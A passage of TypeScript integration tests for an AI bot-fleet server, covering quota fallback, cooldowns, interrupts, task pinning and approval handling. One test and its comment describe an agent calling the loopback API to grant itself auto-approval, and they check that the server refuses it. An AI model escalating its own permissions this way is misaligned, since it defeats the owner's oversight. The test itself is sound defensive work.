          message.tool?.name?.startsWith("Fell over to"),
        );
      }, { timeout: 20_000 }).toBe(true);

      await expect.poll(() => existsSync(fakeClaudeDump), { timeout: 5_000 }).toBe(true);
      const dump = JSON.parse(readFileSync(fakeClaudeDump, "utf8")) as {
        mcpConfig: { mcpServers: { botfleet: { args: string[] } } };
      };
      socket = await connectSocket(dump.mcpConfig.mcpServers.botfleet.args[1]);
      const brokerAnswer = new Promise<{ behavior: string }>((resolve) => {
        let buffer = "";
        socket!.on("data", (chunk) => {
          buffer += chunk;
          const newline = buffer.indexOf("\n");
          if (newline !== -1) resolve(JSON.parse(buffer.slice(0, newline)));
        });
      });
      socket.write(JSON.stringify({
        t: "ask",
        id: "fallback-room-approval",
        tool: "Bash",
        input: { command: "echo safe" },
      }) + "\n");
      await expect.poll(async () => {
        const transcript = await api("GET", `/api/threads/${room.threadId}/messages?limit=200`);
        return transcript.body.messages.some(
          (message: { card?: { requestId?: string } }) => message.card?.requestId === "fallback-room-approval",
        );
      }, { timeout: 5_000 }).toBe(true);

      const answered = await api("POST", `/api/threads/${room.threadId}/respond`, {
        requestId: "fallback-room-approval",
        behavior: "allow",
      });
      expect(answered).toEqual({ status: 200, body: { ok: true, outcome: "allowed-once" } });
      await expect(brokerAnswer).resolves.toMatchObject({ behavior: "allow" });
    } finally {
      socket?.destroy();
      await api("POST", `/api/groups/${room.id}/interrupt`, { threadId: room.threadId });
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  }, 30_000);

  it("records a quota cooldown against the fallback engine that actually ran", async () => {
    expect((await api("PATCH", "/api/instances/quota", { enabled: true })).status).toBe(200);
    const instances = (await api("GET", "/api/instances?fresh=1")).body.instances;
    const crasher = instances.find((instance: { instanceId: string }) => instance.instanceId === "crasher");
    const quota = instances.find((instance: { instanceId: string }) => instance.instanceId === "quota");
    expect(crasher?.snapshot.state).toBe("available");
    expect(quota?.snapshot.state).toBe("available");

    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: {
          instanceId: "crasher",
          model: crasher.models.default,
          fallbacks: [{ instanceId: "quota", model: quota.models.default }],
        },
      })).status).toBe(200);

      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "fail over into quota" })).status).toBe(202);
      await expect.poll(async () => {
        const quotas = (await api("GET", "/api/quotas")).body.cooldowns as Array<{
          botId: string;
          instanceId: string;
          model: string;
        }>;
        return quotas.find((cooldown) => cooldown.botId === bot.id);
      }, { timeout: 20_000 }).toMatchObject({
        botId: bot.id,
        instanceId: "quota",
        model: quota.models.default,
      });

      const cooldowns = (await api("GET", "/api/quotas")).body.cooldowns as Array<{
        botId: string;
        instanceId: string;
      }>;
      expect(cooldowns.some((cooldown) => cooldown.botId === bot.id && cooldown.instanceId === "crasher")).toBe(false);
      const after = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(after.modelSelection.instanceId).toBe("crasher");
      expect(after.busy).toBe(false);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PATCH", "/api/instances/quota", { enabled: false })).status).toBe(200);
    }
  }, 30_000);

  it("does not cool down or replay a successful reply that discusses subscription accounting", async () => {
    expect((await api("PATCH", "/api/instances/quotaProse", { enabled: true })).status).toBe(200);
    expect((await api("PATCH", "/api/instances/quota", { enabled: true })).status).toBe(200);
    const instances = (await api("GET", "/api/instances?fresh=1")).body.instances;
    const quotaProse = instances.find((instance: { instanceId: string }) => instance.instanceId === "quotaProse");
    const quota = instances.find((instance: { instanceId: string }) => instance.instanceId === "quota");
    expect(quotaProse?.snapshot.state).toBe("available");
    expect(quota?.snapshot.state).toBe("available");

    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: {
          instanceId: "quotaProse",
          model: quotaProse.models.default,
          fallbacks: [{ instanceId: "quota", model: quota.models.default }],
        },
      })).status).toBe(200);
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "summarize the accounting work" })).status).toBe(202);
      await expect.poll(async () => {
        const current = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return current?.busy;
      }, { timeout: 10_000 }).toBe(false);

      const transcript = (await api("GET", `/api/threads/${bot.threadId}/messages?limit=200`)).body.messages as Array<{
        text?: string;
        tool?: { name?: string };
      }>;
      expect(transcript.filter((message) => message.text === "The subscription accounting review is complete.")).toHaveLength(1);
      expect(transcript.some((message) => message.text?.includes("You've hit your session limit"))).toBe(false);
      expect(transcript.some((message) => message.tool?.name?.startsWith("Fell over to "))).toBe(false);
      const cooldowns = (await api("GET", "/api/quotas")).body.cooldowns as Array<{ botId: string }>;
      expect(cooldowns.some((cooldown) => cooldown.botId === bot.id)).toBe(false);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PATCH", "/api/instances/quotaProse", { enabled: false })).status).toBe(200);
      expect((await api("PATCH", "/api/instances/quota", { enabled: false })).status).toBe(200);
    }
  }, 30_000);

  it("still falls over from a successful-looking standalone quota chip", async () => {
    expect((await api("PATCH", "/api/instances/quota", { enabled: true })).status).toBe(200);
    expect((await api("PATCH", "/api/instances/pricedClaude", { enabled: true })).status).toBe(200);
    const instances = (await api("GET", "/api/instances?fresh=1")).body.instances;
    const quota = instances.find((instance: { instanceId: string }) => instance.instanceId === "quota");
    const pricedClaude = instances.find((instance: { instanceId: string }) => instance.instanceId === "pricedClaude");
    expect(quota?.snapshot.state).toBe("available");
    expect(pricedClaude?.snapshot.state).toBe("available");

    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: {
          instanceId: "quota",
          model: quota.models.default,
          fallbacks: [{ instanceId: "pricedClaude", model: pricedClaude.models.default }],
        },
      })).status).toBe(200);
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "exercise the terminal quota chip" })).status).toBe(202);
      await expect.poll(async () => {
        const transcript = (await api("GET", `/api/threads/${bot.threadId}/messages?limit=200`)).body.messages as Array<{
          text?: string;
        }>;
        return transcript.some((message) => message.text === "hello from fake claude");
      }, { timeout: 15_000 }).toBe(true);

      const transcript = (await api("GET", `/api/threads/${bot.threadId}/messages?limit=200`)).body.messages as Array<{
        text?: string;
        tool?: { name?: string };
      }>;
      expect(transcript.some((message) => message.text?.includes("You've hit your session limit"))).toBe(true);
      expect(transcript.some((message) => message.tool?.name?.startsWith("Fell over to "))).toBe(true);
      const cooldowns = (await api("GET", "/api/quotas")).body.cooldowns as Array<{
        botId: string;
        instanceId: string;
        error: string;
      }>;
      expect(cooldowns).toContainEqual(expect.objectContaining({
        botId: bot.id,
        instanceId: "quota",
        error: "You've hit your session limit · resets in 30 minutes",
      }));
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PATCH", "/api/instances/quota", { enabled: false })).status).toBe(200);
      expect((await api("PATCH", "/api/instances/pricedClaude", { enabled: false })).status).toBe(200);
    }
  }, 30_000);

  it("keeps Claude subscription-equivalent prices out of the task's actual-spend total", async () => {
    expect((await api("PATCH", "/api/instances/pricedClaude", { enabled: true })).status).toBe(200);
    const pricedClaude = (await api("GET", "/api/instances?fresh=1")).body.instances.find(
      (instance: { instanceId: string }) => instance.instanceId === "pricedClaude",
    );
    expect(pricedClaude?.snapshot.state).toBe("available");
    const bot = (await api("POST", "/api/bots")).body.bot;

    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "pricedClaude", model: pricedClaude.models.default },
      })).status).toBe(200);
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "report subscription usage" })).status).toBe(202);

      await expect.poll(async () => {
        const current = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return current?.busy;
      }, { timeout: 20_000 }).toBe(false);
      const current = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      const task = current.tasks.find((candidate: { threadId: string }) => candidate.threadId === bot.threadId);
      expect(task.usage).toMatchObject({ input: 12, output: 5, costUsd: null, turns: 1 });
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PATCH", "/api/instances/pricedClaude", { enabled: false })).status).toBe(200);
    }
  }, 30_000);

  it("drains a queued credential continuation after deferred fallback finds no candidate", async () => {
    const otherInstances = ["claude", "claude2", "crasher"];
    let botId = "";
    let threadId = "";
    try {
      rmSync(fakeClaudeDump, { force: true });
      rmSync(fakeQuotaGate, { force: true });
      expect((await api("PATCH", "/api/instances/gatedQuota", { enabled: true })).status).toBe(200);
      for (const instanceId of otherInstances) {
        expect((await api("PATCH", `/api/instances/${instanceId}`, { enabled: false })).status).toBe(200);
      }
      const instances = (await api("GET", "/api/instances?fresh=1")).body.instances;
      const gatedQuota = instances.find(
        (instance: { instanceId: string }) => instance.instanceId === "gatedQuota",
      );
      expect(gatedQuota?.snapshot.state).toBe("available");

      const bot = (await api("POST", "/api/bots")).body.bot as { id: string; threadId: string };
      botId = bot.id;
      threadId = bot.threadId;
      expect((await api("PATCH", `/api/bots/${botId}`, {
        modelSelection: { instanceId: "gatedQuota", model: gatedQuota.models.default },
      })).status).toBe(200);
      expect((await api("POST", `/api/bots/${botId}/messages`, { text: "wait for credential" })).status).toBe(202);
      await expect.poll(() => existsSync(fakeClaudeDump), { timeout: 5_000 }).toBe(true);
      const dump = JSON.parse(readFileSync(fakeClaudeDump, "utf8")) as {
        mcpConfig: { mcpServers: { agents: { env: { OMB_COMMS_TOKEN: string } } } };
      };
      const token = dump.mcpConfig.mcpServers.agents.env.OMB_COMMS_TOKEN;

      const requested = await fetch(`${BASE}/api/internal/request-credential`, {
        method: "POST",
        headers: {
          authorization: `Bearer ${token}`,
          "content-type": "application/json",
        },
        body: JSON.stringify({
          fromBotId: botId,
          fromThreadId: threadId,
          credentialId: "openaiImageApiKey",
          reason: "needed after the quota turn",
        }),
      });
      expect(requested.status).toBe(201);
      const { messageId } = (await requested.json()) as { messageId: string };
      expect((await api("POST", `/api/bots/${botId}/secret-cards/${messageId}/dismiss`, {
        threadId,
      }))).toEqual({ status: 200, body: { dismissed: true, resumed: true } });

      // Completion now enters the asynchronous health lookup.  Every other
      // engine is disabled, so the lookup settles without a fallback and the
      // credential continuation must be drained after the bot becomes idle.
      writeFileSync(fakeQuotaGate, "release");
      await expect.poll(async () => {
        const transcript = await api("GET", `/api/threads/${threadId}/messages?limit=200`);
        return transcript.body.messages.filter(
          (message: { text?: string }) => message.text?.includes("You've hit your session limit"),
        ).length;
      }, { timeout: 20_000 }).toBe(2);
      await expect.poll(async () => {
        const current = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === botId,
        );
        return current?.busy;
      }, { timeout: 5_000 }).toBe(false);
    } finally {
      rmSync(fakeQuotaGate, { force: true });
      if (botId) {
        await api("POST", `/api/bots/${botId}/interrupt`, {});
        await api("DELETE", `/api/bots/${botId}`);
      }
      for (const instanceId of otherInstances) {
        expect((await api("PATCH", `/api/instances/${instanceId}`, { enabled: true })).status).toBe(200);
      }
      expect((await api("PATCH", "/api/instances/gatedQuota", { enabled: false })).status).toBe(200);
    }
  }, 40_000);

  it("holds deferred fallback ownership across targeted and unrelated provider reloads", async () => {
    // The harness's one-shot boot recovery scan runs 2.5s after startup.
    // Let it inspect the empty fixture before creating deliberately busy bots.
    await new Promise((resolve) => setTimeout(resolve, 2_700));
    const otherInstances = ["claude", "claude2", "crasher", "quota"];
    const activeBots: Array<{ id: string; threadId: string }> = [];
    try {
      writeFileSync(fakeSlowProbeGate, "release");
      expect((await api("PATCH", "/api/instances/slowProbe", { enabled: true })).status).toBe(200);
      expect((await api("PATCH", "/api/instances/gatedQuota", { enabled: true })).status).toBe(200);
      for (const instanceId of otherInstances) {
        expect((await api("PATCH", `/api/instances/${instanceId}`, { enabled: false })).status).toBe(200);
      }
      const instances = (await api("GET", "/api/instances?fresh=1")).body.instances;
      const gatedQuota = instances.find(
        (instance: { instanceId: string }) => instance.instanceId === "gatedQuota",
      );

      const overlap = async (reloadInstanceId: "gatedQuota" | "claude", queueSuccessor: boolean) => {
        writeFileSync(fakeSlowProbeGate, "release");
        rmSync(fakeSlowProbeStarted, { force: true });
        rmSync(fakeQuotaGate, { force: true });
        rmSync(fakeClaudeDump, { force: true });
        const bot = (await api("POST", "/api/bots")).body.bot as { id: string; threadId: string };
        activeBots.push(bot);
        expect((await api("PATCH", `/api/bots/${bot.id}`, {
          modelSelection: {
            instanceId: "gatedQuota",
            model: gatedQuota.models.default,
          },
        })).status).toBe(200);
        expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "hold quota completion" })).status).toBe(202);
        await expect.poll(() => existsSync(fakeClaudeDump), { timeout: 5_000 }).toBe(true);

        rmSync(fakeSlowProbeGate, { force: true });
        const slowDescribe = api("GET", "/api/instances?fresh=1");
        await expect.poll(() => existsSync(fakeSlowProbeStarted), { timeout: 5_000 }).toBe(true);
        let reload: Promise<{ status: number; body: any }>;
        if (reloadInstanceId === "claude") {
          reload = api("PATCH", `/api/instances/${reloadInstanceId}`, { fullAuto: true });
        }

        writeFileSync(fakeQuotaGate, "release");
        await expect.poll(async () => {
          const transcript = await api("GET", `/api/threads/${bot.threadId}/messages?limit=200`);
          return transcript.body.messages.some(
            (message: { text?: string }) => message.text?.includes("You've hit your session limit"),
          );
        }, { timeout: 5_000 }).toBe(true);

        if (reloadInstanceId === "gatedQuota") {
          reload = api("PATCH", `/api/instances/${reloadInstanceId}`, { fullAuto: true });
          await expect.poll(async () => {
            const transcript = await api("GET", `/api/threads/${bot.threadId}/messages?limit=200`);
            return transcript.body.messages.some((message: { tool?: { name?: string } }) =>
              message.tool?.name?.includes("provider settings changed"),
            );
          }, { timeout: 5_000 }).toBe(true);
        }

        if (queueSuccessor) {
          expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "run after reload" }))).toEqual({
            status: 202,
            body: expect.objectContaining({ ok: true, queued: true }),
          });
        }
        const held = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        expect(held?.busy).toBe(true);

        writeFileSync(fakeSlowProbeGate, "release");
        expect((await slowDescribe).status).toBe(200);
        expect((await reload!).status).toBe(200);
        if (queueSuccessor) {
          // The targeted reload suppresses the interrupted turn's fallback,
          // then the completion fold drains this successor.  Its own quota
          // response and launch dump prove it reached the replacement fleet.
          await expect.poll(async () => {
            const transcript = await api("GET", `/api/threads/${bot.threadId}/messages?limit=200`);
            let launchedQueuedPrompt = false;
            try {
              launchedQueuedPrompt = JSON.stringify(JSON.parse(readFileSync(fakeClaudeDump, "utf8"))).includes(
                "run after reload",
              );
            } catch {
              // The fake CLI replaces its dump atomically, but it may not
              // have launched the successor yet.
            }
            return {
              launchedQueuedPrompt,
              queuedUserVisible: transcript.body.messages.some(
                (message: { role?: string; text?: string }) =>
                  message.role === "user" && message.text === "run after reload",
              ),
              quotaReplies: transcript.body.messages.filter(
                (message: { text?: string }) => message.text?.includes("You've hit your session limit"),
              ).length,
            };
          }, { timeout: 10_000 }).toEqual({
            launchedQueuedPrompt: true,
            queuedUserVisible: true,
            quotaReplies: 2,
          });
        } else {
          await expect.poll(async () => {
            const state = (await api("GET", "/api/bots")).body.bots.find(
              (candidate: { id: string }) => candidate.id === bot.id,
            );
            return {
              busy: state?.busy,
              fellOver: state?.messages.some((message: { tool?: { name?: string } }) =>
                message.tool?.name?.startsWith("Fell over to"),
              ),
            };
          }, { timeout: 10_000 }).toEqual({ busy: true, fellOver: true });
        }

        const beforeStop = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        if (beforeStop?.busy) {
          const stop = await api("POST", `/api/bots/${bot.id}/interrupt`, {});
          expect(stop.body).toMatchObject({ ok: true, stopped: true });
        }
        await expect.poll(async () => {
          const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
            (candidate: { id: string }) => candidate.id === bot.id,
          );
          return state?.busy;
        }).toBe(false);
        await api("DELETE", `/api/bots/${bot.id}`);
        activeBots.splice(activeBots.indexOf(bot), 1);
        expect((await api("PATCH", `/api/instances/${reloadInstanceId}`, { fullAuto: false })).status).toBe(200);
      };

      // Reloading the completed engine latches the old request, then drains
      // the queued successor.  Reloading another engine preserves and starts
      // the already-selected fallback after the replacement fleet is live.
      await overlap("claude", false);
      await overlap("gatedQuota", true);
    } finally {
      writeFileSync(fakeSlowProbeGate, "release");
      writeFileSync(fakeQuotaGate, "release");
      for (const bot of activeBots) {
        await api("POST", `/api/bots/${bot.id}/interrupt`, {});
        await api("DELETE", `/api/bots/${bot.id}`);
      }
      for (const instanceId of otherInstances) {
        expect((await api("PATCH", `/api/instances/${instanceId}`, { enabled: true })).status).toBe(200);
      }
      expect((await api("PATCH", "/api/instances/gatedQuota", { enabled: false, fullAuto: false })).status).toBe(200);
      expect((await api("PATCH", "/api/instances/slowProbe", { enabled: false, fullAuto: false })).status).toBe(200);
    }
  }, 40_000);

  it("reports stopped:false when the stop matched no live turn", async () => {
    // An idle bot has no session on any instance. The old endpoint answered a
    // flat {ok:true} here and when it really had stopped something, so the UI
    // could not tell the owner that their press did nothing.
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const stop = await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      expect(stop.status).toBe(200);
      expect(stop.body).toMatchObject({ ok: true, stopped: false });
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("refuses to interrupt a conversation after its active task changed", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Exact stop", memberIds: [bot.id] })).body.group;
    try {
      const wrongBot = await api("POST", `/api/bots/${bot.id}/interrupt`, { threadId: "old-task" });
      expect(wrongBot.status).toBe(409);
      const wrongRoom = await api("POST", `/api/groups/${room.id}/interrupt`, { threadId: "old-task" });
      expect(wrongRoom.status).toBe(409);
      expect((await api("POST", `/api/bots/${bot.id}/interrupt`, { threadId: bot.threadId })).status).toBe(200);
      expect((await api("POST", `/api/groups/${room.id}/interrupt`, { threadId: room.threadId })).status).toBe(200);
      for (const route of [`/api/bots/${bot.id}/interrupt`, `/api/groups/${room.id}/interrupt`]) {
        const compatibleNull = await fetch(`${BASE}${route}`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: "null",
        });
        expect(compatibleNull.status).toBe(200);
        const rejectedArray = await fetch(`${BASE}${route}`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: "[]",
        });
        expect(rejectedArray.status).toBe(400);
      }
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("pins sends to the expected task and offers compact switch responses", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Pinned sends", memberIds: [bot.id] })).body.group;
    try {
      const wrongBot = await api("POST", `/api/bots/${bot.id}/messages`, {
        text: "Do not reroute me",
        threadId: "old-task",
      });
      expect(wrongBot.status).toBe(409);
      expect(wrongBot.body.error).toMatch(/switched tasks/i);

      const wrongRoom = await api("POST", `/api/groups/${room.id}/messages`, {
        text: "Do not reroute me",
        threadId: "old-task",
      });
      expect(wrongRoom.status).toBe(409);
      expect(wrongRoom.body.error).toMatch(/switched tasks/i);

      const botOriginal = bot.threadId;
      const botTask = await api("POST", `/api/bots/${bot.id}/tasks`, { title: "Second" });
      expect(botTask.status).toBe(201);
      const compactBot = await api("POST", `/api/bots/${bot.id}/tasks/${botOriginal}?messages=0`, {});
      expect(compactBot.status).toBe(200);
      expect(compactBot.body.bot.threadId).toBe(botOriginal);
      expect(compactBot.body.bot.tasks).toHaveLength(2);
      expect(compactBot.body.bot).not.toHaveProperty("messages");
      expect(compactBot.body.bot).not.toHaveProperty("activeLeafId");

      const roomOriginal = room.threadId;
      const roomTask = await api("POST", `/api/groups/${room.id}/tasks`, { title: "Second" });
      expect(roomTask.status).toBe(201);
      const compactRoom = await api("POST", `/api/groups/${room.id}/tasks/${roomOriginal}?messages=0`, {});
      expect(compactRoom.status).toBe(200);
      expect(compactRoom.body.group.threadId).toBe(roomOriginal);
      expect(compactRoom.body.group.tasks).toHaveLength(2);
      expect(compactRoom.body.group).not.toHaveProperty("messages");
      expect(compactRoom.body.group).not.toHaveProperty("activeLeafId");
    } finally {
      await api("POST", `/api/groups/${room.id}/interrupt`, {});
      await api("DELETE", `/api/groups/${room.id}`);
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("replays committed sends after a task switch but rejects an unknown key", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Retry pin", memberIds: [bot.id] })).body.group;
    const botText = "Run this bot instruction once";
    const roomText = "Run this room instruction once";
    try {
      const firstBot = await api("POST", `/api/bots/${bot.id}/messages`, {
        text: botText,
        threadId: bot.threadId,
        idempotencyKey: "ios-bot-lost-response",
      });
      expect(firstBot.status).toBe(202);
      const stoppedBot = await api("POST", `/api/bots/${bot.id}/interrupt`, { threadId: bot.threadId });
      expect(stoppedBot.status).toBe(200);
      await expect.poll(async () => {
        const current = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return current?.busy;
      }, { timeout: 5_000 }).toBe(false);
      const secondBotTask = await api("POST", `/api/bots/${bot.id}/tasks`, { title: "After lost response" });
      expect(secondBotTask.status).toBe(201);

      const botRetry = await api("POST", `/api/bots/${bot.id}/messages`, {
        text: botText,
        threadId: bot.threadId,
        idempotencyKey: "ios-bot-lost-response",
      });
      expect(botRetry.status).toBe(202);
      expect(botRetry.body).toMatchObject({ ok: true, replayed: true });
      const unknownBotRetry = await api("POST", `/api/bots/${bot.id}/messages`, {
        text: "Must not reach the new task",
        threadId: bot.threadId,
        idempotencyKey: "ios-bot-unknown-key",
      });
      expect(unknownBotRetry.status).toBe(409);
      const botOriginal = await api("GET", `/api/threads/${bot.threadId}/messages?limit=200`);
      expect(botOriginal.body.messages.filter((message: { text?: string }) => message.text === botText)).toHaveLength(1);

      await api("PATCH", `/api/groups/${room.id}/setup`, { action: "skip" });
      const firstRoom = await api("POST", `/api/groups/${room.id}/messages`, {
        text: roomText,
        threadId: room.threadId,
        idempotencyKey: "ios-room-lost-response",
      });
      expect(firstRoom.status).toBe(202);
      const stoppedRoom = await api("POST", `/api/groups/${room.id}/interrupt`, { threadId: room.threadId });
      expect(stoppedRoom.status).toBe(200);
      await expect.poll(async () => {
        const current = (await api("GET", "/api/bots?messages=0")).body.groups.find(
          (candidate: { id: string }) => candidate.id === room.id,
        );
        return current?.busyBotId ?? null;
      }, { timeout: 5_000 }).toBeNull();
      const secondRoomTask = await api("POST", `/api/groups/${room.id}/tasks`, { title: "After lost response" });
      expect(secondRoomTask.status).toBe(201);

      const roomRetry = await api("POST", `/api/groups/${room.id}/messages`, {
        text: roomText,
        threadId: room.threadId,
        idempotencyKey: "ios-room-lost-response",
      });
      expect(roomRetry.status).toBe(202);
      expect(roomRetry.body).toMatchObject({ ok: true, replayed: true });
      const unknownRoomRetry = await api("POST", `/api/groups/${room.id}/messages`, {
        text: "Must not reach the new room task",
        threadId: room.threadId,
        idempotencyKey: "ios-room-unknown-key",
      });
      expect(unknownRoomRetry.status).toBe(409);
      const roomOriginal = await api("GET", `/api/threads/${room.threadId}/messages?limit=200`);
      expect(roomOriginal.body.messages.filter((message: { text?: string }) => message.text === roomText)).toHaveLength(1);
    } finally {
      await api("POST", `/api/groups/${room.id}/interrupt`, {});
      await api("DELETE", `/api/groups/${room.id}`);
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("leaves a bot with no effort level untouched", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    expect(bot.modelSelection.effort).toBeUndefined();

    const renamed = await api("PATCH", `/api/bots/${bot.id}`, { name: "Plain" });
    expect(renamed.status).toBe(200);
    expect(renamed.body.bot.modelSelection.effort).toBeUndefined();
  });

  // This fixture pins a single unknown driver, so no instance here ever
  // resolves: these cover the gate's pass-through and the store's replace
  // semantics, NOT the comparison against a live engine's declared list.
  // That branch has no coverage at this layer, and manufacturing a live
  // instance in this fixture would cost it its no-probe determinism.
  it("round-trips an effort level and clears it when the key is dropped", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const selection = { instanceId: "ghost", model: "ghost-1" };

    const set = await api("PATCH", `/api/bots/${bot.id}`, {
      modelSelection: { ...selection, effort: "high" },
    });
    expect(set.status).toBe(200);
    expect(set.body.bot.modelSelection.effort).toBe("high");

    const reread = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === bot.id);
    expect(reread.modelSelection.effort).toBe("high");

    // The panel's "Default" button spreads the selection with effort:
    // undefined, and JSON.stringify drops the key — so clearing reaches the
    // server as a modelSelection carrying no effort at all.
    const cleared = await api("PATCH", `/api/bots/${bot.id}`, { modelSelection: selection });
    expect(cleared.status).toBe(200);

    const after = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === bot.id);
    expect(after.modelSelection).toEqual(selection);
    expect(after.modelSelection.effort).toBeUndefined();
    await api("DELETE", `/api/bots/${bot.id}`);
  });

  it("grants Auto on this computer only through the warning acknowledgement", async () => {
    const created = await api("POST", "/api/bots");
    const bot = created.body.bot;
    expect((await api("PATCH", `/api/bots/${bot.id}`, { computers: ["cloud"], autoApprove: true })).body.bot.autoApprove).toBe(
      true,
    );

    // The important half: a blind PATCH — exactly what a bot curling the
    // loopback API from a tool call would send — must be refused. The
    // renderer's warning dialog is not a boundary; this 400 is.
    const blind = await api("PATCH", `/api/bots/${bot.id}`, { computers: ["local"] });
    expect(blind.status).toBe(400);
    const oneShot = await api("PATCH", `/api/bots/${bot.id}`, { computers: ["local"], autoApprove: true });
    expect(oneShot.status).toBe(400);
    const after = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === bot.id);
    expect(after.computers || []).not.toContain("local");

    // The dialog's acknowledgement grants it, and the flag is not persisted.
    const local = await api("PATCH", `/api/bots/${bot.id}`, { computers: ["local"], acknowledgeLocalAuto: true });
    expect(local.status).toBe(200);
    expect(local.body.bot).toMatchObject({ computers: ["local"], autoApprove: true });
    expect(local.body.bot.acknowledgeLocalAuto).toBeUndefined();

    // Once granted, re-asserting auto and unrelated PATCHes need no re-ack.
    const enabled = await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true });
    expect(enabled.status).toBe(200);
    expect(enabled.body.bot.autoApprove).toBe(true);

    // The other direction needs the warning too: local first, then auto.
    await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: false });
    const autoBlind = await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true });
    expect(autoBlind.status).toBe(400);
    const autoAcked = await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true, acknowledgeLocalAuto: true });
    expect(autoAcked.status).toBe(200);

    // Leaving local ends the grant; coming back needs the warning again.
    await api("PATCH", `/api/bots/${bot.id}`, { computers: [] });
    const back = await api("PATCH", `/api/bots/${bot.id}`, { computers: ["local"] });
    expect(back.status).toBe(400);
    await api("DELETE", `/api/bots/${bot.id}`);
  });

  it("stores only known approval-review modes", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    for (const autoReview of ["off", "shadow", "enforce"]) {
      const response = await api("PATCH", `/api/bots/${bot.id}`, { autoReview });
      expect(response.status).toBe(200);
      expect(response.body.bot.autoReview).toBe(autoReview);
    }
    expect((await api("PATCH", `/api/bots/${bot.id}`, { autoReview: "always" })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { autoReview: true })).status).toBe(400);
    await api("DELETE", `/api/bots/${bot.id}`);
  });

  it("offers an idempotent stop boundary for active local turns", async () => {
    const unsupported = await api("POST", "/api/local-computer/interrupt");
    expect(unsupported).toEqual({
      status: 415,
      body: { error: "content-type must be application/json" },
    });
    const stopped = await api("POST", "/api/local-computer/interrupt", {});
    expect(stopped).toEqual({ status: 200, body: { ok: true } });
  });

  it("persists an answered onboarding card", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];
    const card = bot.messages.find((m: { kind: string }) => m.kind === "options");
    const res = await api("PATCH", `/api/bots/${bot.id}/cards/${card.id}`, { answered: card.card.options[0] });
    expect(res.status).toBe(200);
    expect(res.body.message.card.answered).toBe(card.card.options[0]);
  });

  it("validates approval decisions and reports a request that is no longer open", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];

    const invalid = await api("POST", `/api/bots/${bot.id}/respond`, {
      requestId: "gone",
      behavior: "approve-everything",
    });
    expect(invalid.status).toBe(400);

    const unavailable = await api("POST", `/api/bots/${bot.id}/respond`, {
      requestId: "gone",
      behavior: "allow",
    });
    expect(unavailable.status).toBe(200);
    expect(unavailable.body).toEqual({ ok: true, outcome: "unavailable" });

    const reread = (await api("GET", "/api/bots")).body.bots.find((candidate: { id: string }) => candidate.id === bot.id);
    expect(reread.messages.at(-1).tool).toMatchObject({ ok: false });
    expect(reread.messages.at(-1).tool.name).toContain("request is no longer open");
  });

  it("answers a room approval whose turn is already over instead of stranding the room", async () => {
    // busyBotId lives in memory only, so a card that outlives its turn (or the
    // process) has no speaker. The room must still be answerable: a pending
    // approval takes over the composer, so a dead end locks the room for good.
